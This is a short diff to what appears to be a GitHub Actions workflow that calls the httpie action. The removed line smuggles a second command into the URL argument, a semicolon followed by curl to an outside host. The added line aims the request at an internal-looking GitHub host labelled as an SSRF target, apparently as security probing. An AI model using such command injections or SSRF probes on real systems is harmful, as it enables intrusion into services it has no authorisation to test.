@@ -5,5 +5,5 @@ workflow "Call external API" {
 
 action "Call httpbin" {
   uses = "swinton/httpie.action@master"
-  args = ["GET", "google.com; curl https://amex.securify.network/curl.php"]
+  args = ["GET", "ssrf-target.service.cp1-iad.github.net/some-url-of-your-choice"]
 }
